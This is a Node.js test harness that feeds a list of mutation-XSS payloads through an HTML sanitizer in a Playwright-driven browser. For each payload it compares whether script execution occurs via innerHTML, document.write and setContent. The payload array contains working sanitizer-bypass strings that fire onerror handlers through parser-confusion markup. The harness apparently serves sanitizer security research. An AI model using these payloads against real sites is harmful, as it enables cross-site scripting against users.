const argv = require("minimist")(process.argv.slice(2));
const browsers = require("./browsers.js");
const sanitizers = require("./sanitizers.js");
const chalk = require("chalk");
const {eval_payload_innerhtml, eval_payload_write, eval_payload_set_content} = require("./pw-validator.js");
const {setup_context} = require("./pw-validator");

const payloads = [
  "<svg title=<p>/*<textarea><form><math></p></style><form>*/<style></select><img src=x onerror=mxss(1)></form></mglyph></textarea>*/</p>\"><span>",
  "<svg><form><math></p></style><form><style></select><img src=x onerror=mxss(1)></form></mglyph>",
  "<svg><form><math><form><style><img src=x onerror=mxss(1)></form>",
  "<svg><form><form><style><img src=x onerror=mxss(1)></form>",
  "<form><math><form><style><img src=x onerror=mxss(1)></form>",
  "<math><form><style><img src=x onerror=mxss(1)></form>",
  "<form><math><style><img src=x onerror=mxss(1)></form>",
  "<form><form><style><img src=x onerror=mxss(1)></form>",
  "<form><form><style><img src=x onerror=mxss(1)></form>",
  "<math><style><img src=x onerror=mxss(1)>",
    "<p><a href='http://example.com/' onclick='stealCookies()'>Link</a></p>",
  "<select><template><style><!--</style><a rel=\"--></style></template></select><img id=a src onerror=alert(1)>\">",
  "<form><math><mtext></form><form><mglyph><style></math><img id=a src onerror=alert(1)>",
  "<x/><title>&amp;lt;/title&amp;gt;&amp;lt;img id=a src=1 onerror=alert(1)&amp;gt;",
  "<noscript><a title=\"</noscript><img id=a src=x onerror=alert(1)>\">",
  "<noscript><style></noscript><img id=a src=x onerror=alert(1)>",
  "<svg><style><img id=a src=x onerror=alert(1)></style></svg>",
  "<svg><style>/*</style><img id=a src onerror=alert(1)*/",
  "<svg><textarea>/*</textarea><img id=a src onerror=alert(1)*/",
  "<style><mglyph><textarea title='<!--<!--</style><img id=a src=x onerror=mxss(1)>*/</mtext><!---->-->'></mglyph></style>",
  "<div id='--!><style><!--</form><form id='<select><img id=a src=x onerror=mxss(1)></select>--!>'>--!>--!><!---->--!></style></style>'>",
  "<span><mglyph><span foo='<!--<keygen><math><style title='<a><img id=a src=x onerror=mxss(1)></a></noscript>'></math></keygen>-->*/'></mglyph><!--<style></span>--!>",
  "<a foo='<!--<span foo='/*<!--<select><img id=a src=x onerror=mxss(1)></select><br></mglyph>--><textarea>'>-->'>",
  "<textarea></noscript><mtext></textarea><!----!><img id=a src=x onerror=mxss(1)><input></select>/*--></mtext></mglyph>",
  "</span><form>/*<svg></p>/*<form></form><img id=a src=x onerror=mxss(1)><div></form></div>*/</br>--!></svg><p>*/</style></form>",
  "<form foo=<a id=<!--<mglyph title=/*<style><form><img id=a src=x onerror=mxss(1)></form></style>*/'>-->>/*><div>",
  "</form><math><style><img id=a src=x onerror=mxss(1)><math></style><style></math><div>",
  "<a id=/*<!--</div><img id=a src=x onerror=mxss(1)>-->*/><style>",
  "<mglyph></select><mglyph><svg><img id=a src=x onerror=mxss(1)></svg></mglyph><select></mglyph>",
  "<div><math>\"<br><a><a id='<!--*/</svg>--!><span id='<math><img id=a src=x onerror=mxss(1)></math>></style>--><!--'></a></br></math></div>",
  "<style id=<span><mtext><style data-foo=/*<input></a></style><mglyph><mtext title=<script>mxss(1)</script>'></input>*/\"></mtext></span>/*><!--\"",
  '<a id=<span><svg data-foo="<mglyph title="</style><style>&lt;select&gt;&lt;img id=a src=x onerror=mxss(1)&gt;&lt;div&gt;&lt;/select&gt;<keygen>"><p><!--></span></title></span>>',
  '<select><var><div foo=<!--</math><!--<iframe><select><keygen></mi><img id=a src=x onerror=mxss(1)></keygen></select></plaintext></iframe>--!></td><!--</xmp>--!>></select>',
  '<noembed>--!><select><iframe><mglyph><select><img id=a src=x onerror=mxss(1)></select></mglyph></iframe></select>/*</noembed>',
  '<svg><style id=<div><style><![CDATA[<!--<!--<style>--><img id=a src=x onerror=mxss(1)>*/</pre>--!><ul><dl>]]><mo></style></div>>',
  '<var><svg></foreignobject><style></br><![CDATA[</plaintext>/*</ms><div>"<img id=a src=x onerror=mxss(1)></div>*/<script>]]></style></br></svg></var>',
  `<svg title="<annotation-xml foo=<annotation-xml encoding="application/xhtml+xml">--><style title=''</annotation-xml>/*&lt;img id=a src=x onerror=mxss(1)&gt;*/"<noembed>''>--!>>">"`,
  `<svg><style foo=<noframes>-->&lt;img id=a src=x onerror=mxss(1)&gt;--&gt;&lt;!--]]></pre></xmp><annotation-xml encoding="application/xhtml+xml">">]]></svg><mglyph></dfn>`,
  `<noscript xmlns="http://www.w3.org/1998/Math/MathML"><a title=""></noscript><img id=a src=x onerror=alert(1)>">`,
  `<select><var><div foo=<!--</math><!--<iframe><select><keygen></mi><img src=x onerror=mxss(1)></keygen></select></plaintext></iframe>--!></td><!--</xmp>--!>></select>`,
  `<desc data-foo=<br><select><mglyph><iframe>/*<style>-->--!><keygen><img src=x onerror=mxss(1)><title></keygen></style></path><noembed><path></mglyph></br>>`,
  `<select>"</plaintext></listing><iframe><ms><ul><input title=<annotation-xml encoding="application/xhtml+xml"><input>--><annotation-xml encoding="application/xhtml+xml"><mtext><img src=x onerror=mxss(1)></mtext></annotation-xml></input></annotation-xml>></ms>/*</select>`,
  `<svg title="<annotation-xml foo=<annotation-xml encoding="application/xhtml+xml">--><style title=''</annotation-xml>/*&lt;img src=x onerror=mxss(1)&gt;*/"<noembed>''>--!>>">"`,
  `<select><keygen><iframe title=<table><mi><keygen>'<mglyph><img src=x onerror=mxss(1)>--!></mglyph></keygen>--!></mtext><var><pre></mi></table></xmp>></keygen></select>`,
  `<br/><hr><br><p></br></div><div> <!-- foo -->`,
  `<div><![CDATA[<img src=x onerror=mxss(1)]]>`,
  `<select><template><style><!--</style><a rel="--></style></template></select><img id=a src onerror=alert(1)>">`,
  `<input foo="*/<br><!--<div data-foo="<a><math></a><img src=x onerror=mxss(1)></a></math></a>>-->">`,
  `<math>/*<style><xmp><table><title></annotation-xml><mn id=<p>/*<img src=x onerror=mxss(1)>*/<!--</p><font>></title><!--<span></style>*/</math>`,
  `"<math id=""</desc>/*<p id=""<mglyph><dl><desc><noembed><ms id=<pre><img src=x onerror=mxss(1)></pre>></title>-->--!></noembed></desc></dl>"">*/<![CDATA["">"`,
  `"</pre>--><svg title=<desc>--!><noembed>/*<li><title><img src=x onerror=mxss(1)></title></li>*/]]><annotation-xml encoding=""text/html""></noembed></desc>-->></ms><svg>"`,
  `<keygen><ul><svg><header><listing><title>--><img src=x onerror=mxss(1)></title></listing></header></ul></keygen>`,
  `"</noscript>*/<svg foo=""</header></math>--><noscript data-foo=""</span><p><style><foreignobject><img src=x onerror=mxss(1)></foreignobject></style></p>""><font>"">--!>-->"`,
  `"<math></dfn></a><div><xmp></td><!----><annotation-xml encoding=""text/html""><img src=x onerror=mxss(1)></annotation-xml></dfn></div><annotation-xml></math>""<!--</br>"`,
  `"<![CDATA[<!--</title><svg id=<!--<svg><var><title><img src=x onerror=mxss(1)>""</svg>--!>'>--!>]]>"`,
  `"<select><keygen id=""<noembed>'<textarea data-foo=""<noscript><!----><select data-foo=/*]]><img src=x onerror=mxss(1)>*/"">--></dl>--></noscript>"">/*"">"`,
  `"<svg></dfn><ul>*/<annotation-xml encoding=""application/xhtml+xml""><header><title><desc><img src=x onerror=mxss(1)>'<form></title></header>--></annotation-xml><!--</header></input></ul></svg>"`,
  `"</li><table><listing title=""--><mglyph foo=""<noembed><svg><li>""<title><img src=x onerror=mxss(1)></title></li>--!>""></path>""><desc></table></span>"`,
  `&lt;math&gt;&lt;td&gt;&lt;br /&gt;&lt;desc /&gt;&lt;math&gt;&lt;select&gt;&lt;mn&gt;&lt;dl&gt;&lt;!--&lt;math/&gt;&lt;listing/&gt;&lt;noembed&gt;&lt;foreignobject&gt;&amp;lt;mi&amp;gt;&amp;lt;img src=x onerror=mxss(1)&amp;gt;&lt;/noembed&gt;&lt;p&gt;&lt;/mi&gt;--&gt;&lt;/dl&gt;&lt;/mn&gt;&lt;/select&gt;&lt;/math&gt;&lt;path&gt;&lt;/path&gt;/*&lt;br&gt;&lt;/td&gt;&lt;/math&gt;<dl></dl>`,
  `<script>mxss(1)</script>`,
  ` &lt;noframes&gt;&lt;span&gt;&lt;pre foo=&lt;a id=&lt;img src=x onerror=mxss(1)&gt;"&gt;&gt;--&gt;&lt;/span&gt; &lt;/noframes&gt;&lt;font/&gt;&lt;p&gt;]]&gt;&lt;mo/&gt;"/&gt; &gt;*/&lt;/form&gt;&lt;annotation-xml/&gt;'/&gt;"&gt;&lt;/textarea&gt;`,
  `<table id=<textarea id="abc"><desc id="<iframe foo=xyz><option><style id=""<mtext title=bar><path><mi/>  <desc data-foo=xyz' name="bar"><dfn><img src=x onerror=mxss(1)></dfn></desc> </dt><! &apos; title=bar'></option></iframe>--!><xmp data-foo='baz'/>"></textarea><option>/><embed/> `
];

(async function() {
  const browser_choice = argv["browser"] === undefined ? "chromium" : argv["browser"];
  const sanitizer_choice = argv["sanitizer"] === undefined ? "vanilla" : argv["sanitizer"];

  let used_browser = browsers.browsers[browser_choice];
  let sanitizer = sanitizers.sanitizers[sanitizer_choice];

  console.log(`Running tests with ${used_browser.name} and ${sanitizer.name}`);

  let browser = await used_browser.browser.launch()
  let context = await browser.newContext({
      ignoreHTTPSErrors: true
    });
  await setup_context(context);
  let page = await context.newPage();

  let i = 1;
    for(const payload of payloads) {
      let fmt = chalk.magenta;
      console.log(`\tinnerHTML:`);
      let result1 = await eval_payload_innerhtml(page, {
        id: i++,
        sanitized: "",
        outputs: [],
        error: false,
        error_message: "",
        output: "",
        serialized: "",
        executed: false,
        mode_id: 1,
        browser_id: 2
      }, { payload: payload, teid: i*7 })
      console.log(`\tdocument.write:`);
      let result2 = await eval_payload_write(page, {
        id: i++,
        sanitized: "",
        outputs: [],
        error: false,
        error_message: "",
        output: "",
        serialized: "",
        executed: false,
        mode_id: 1,
        browser_id: 2
      }, { payload: payload, teid: i*13 })
      console.log(`\tsetContent:`);
      let result3 = await eval_payload_set_content(page, {
        id: i++,
        sanitized: "",
        outputs: [],
        error: false,
        error_message: "",
        output: "",
        serialized: "",
        executed: false,
        mode_id: 1,
        browser_id: 2
      }, { payload: payload, teid: i*37 })
      if(result1.executed != result2.executed || result1.executed != result3. executed || result2.executed != result3.executed) {
        fmt = chalk.yellow;
      }
      console.log(fmt(`\t${result1.executed}/${result2.executed}/${result3.executed} for ${payload}\n\tinnerHTML: ${result1.serialized}\n\tdoc.write: ${result2.serialized}`));
    }

    await context.close();
    await browser.close();
})();

